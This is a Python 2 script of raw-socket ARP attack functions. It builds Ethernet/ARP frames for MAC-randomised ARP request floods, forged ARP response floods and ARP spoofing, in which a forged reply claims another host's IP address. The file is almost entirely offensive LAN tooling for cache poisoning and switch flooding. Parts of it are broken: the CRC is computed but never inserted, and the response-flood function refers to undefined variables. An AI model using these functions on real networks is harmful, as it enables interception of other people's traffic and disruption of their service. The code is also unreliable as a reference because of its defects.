from socket import * 
from utils import mergearrays,dotteddec2binary, mac2binary, randommac, getinterface_ip,getinterface_mac
from binascii import crc32

ARP_OPCODE_REQUEST = "\x01"
ARP_OPCODE_RESPONSE = "\x02"

def construct_arp(sender_hw_address, dest_hw_address, opcode, sender_proto_address, target_hw_address,target_proto_address):
	#arp body constructor
	frame= bytearray()
	#ETHERNET HEADER, Destination + source + packet_type
	#----------------------------------------------------
	#destination hardware address
	frame = mergearrays(frame,mac2binary(dest_hw_address))
	frame = mergearrays(frame,mac2binary(sender_hw_address))
	#ethernet packet type = 0x08 0x06
	frame.append("\x08")
	frame.append("\x06")
	#ETHERNET BODY: THE ARP message : Hardware Type + Protocol Type + Hardware Address Size + Protocol Address Type + Operation Code
	#               + sender hardware address + sender protocol address + target hardware address + target protocol address
	#hardware type
	frame.append("\x00")
	frame.append("\x01")
	#protocol type
	frame.append("\x08")
	frame.append("\x00")
	#hardware address size
	frame.append("\x06")
	#protocol address size
	frame.append("\x04")
	#opcode
	frame.append("\x00")
	frame.append(opcode) #1 for request, 2 for response
	#sender hardware address
	frame = mergearrays(frame,mac2binary(sender_hw_address))
	#sender protocol address
	frame = mergearrays(frame,dotteddec2binary(sender_proto_address))
	#target hardware address
	frame = mergearrays(frame,mac2binary(target_hw_address))
	#target protocol address
	frame = mergearrays(frame,dotteddec2binary(target_proto_address))
	#padding
	i=1
	while len(frame)<56:	#total size is 60, need four for checksum
		frame.append("\x00")
	#ETHERNET CRC
	frame = calc_crc(frame)
	
	return frame

def calc_crc(frame):
	#TODO
	#1. add dummy crc
	tmpframe = frame
	tmpframe.append("\x00")
	tmpframe.append("\x00")
	tmpframe.append("\x00")
	tmpframe.append("\x00")
	#2. calc real crc 
	str= "".join(chr(b) for b in frame)
	check = crc32(str)
	#print hex(check)
	#3. replace dummy with real crc
	return tmpframe


def arprequestflood(interface, requested_ip, fromip = "", counter=10):
	#interface: 	network interface you want to use
	#requested_ip: 	the ip you want to obtain the mac from (not really though :) )
	#fromip: 	your ip address, omit to use interface ip, can be specified to "spoof" ip adress
	#counter: 	number of packets to send
	#
	i=0
	s = socket(AF_PACKET, SOCK_RAW) 
	s.bind((interface, 0)) 
	
	if fromip=="": fromip = getinterface_ip(interface)
	
	while (i<counter):
		i=i+1
		randmac = randommac()
		tmpFrame = construct_arp(randmac, "FF:FF:FF:FF:FF:FF", ARP_OPCODE_REQUEST, fromip,"00:00:00:00:00:00",requested_ip)
		print "Sent arp request from: " + randmac
		s.send(tmpFrame)
	#end while

#end def

def arpresponseflood():
	i=0
	s = socket(AF_PACKET, SOCK_RAW) 
	s.bind(("eth0", 0)) 
	
	while (i<counter):
		i=i+1
		randmac = randommac()
		tmpFrame = construct_arp(randmac, "FF:FF:FF:FF:FF:FF", ARP_OPCODE_RESPONSE, fromip,"00:00:00:00:00:00",request_ip)
		print "Sent arp request from: " + randmac
		s.send(tmpFrame)
	#end while


def arpspoof(interface, destination_ip, spoofed_ip, spoofed_mac="", destination_mac=""):
	if destination_mac=="": destination_mac= "FF:FF:FF:FF:FF:FF"	#broadcast?
	if spoofed_mac=="": spoofed_mac=getinterface_mac(interface)	#set to your mac
	
	s = socket(AF_PACKET, SOCK_RAW) 
	s.bind((interface, 0)) 
		
	tmpframe = construct_arp(spoofed_mac, destination_mac, ARP_OPCODE_RESPONSE, spoofed_ip, destination_mac,destination_ip)
	
	s.send(tmpframe)

